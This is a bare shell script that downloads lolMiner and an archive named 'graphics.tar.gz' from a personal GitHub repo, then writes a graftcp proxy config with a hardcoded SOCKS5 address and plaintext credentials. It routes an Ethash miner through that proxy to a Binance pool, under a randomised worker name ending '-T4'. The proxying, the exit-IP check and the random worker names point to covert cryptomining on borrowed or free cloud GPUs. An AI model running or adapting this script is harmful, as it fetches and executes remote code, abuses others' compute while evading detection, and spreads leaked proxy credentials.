wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz
tar -xvf lolMiner_v1.51a_Lin64.tar.gz
cd 1.51a 

wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.140.13.119:9132

socks5_username = faraddd8x

socks5_password = faraddd8x

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "


./graftcp/graftcp ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user teguhcong.$(echo $(shuf -i 1-999 -n 1)-T4)
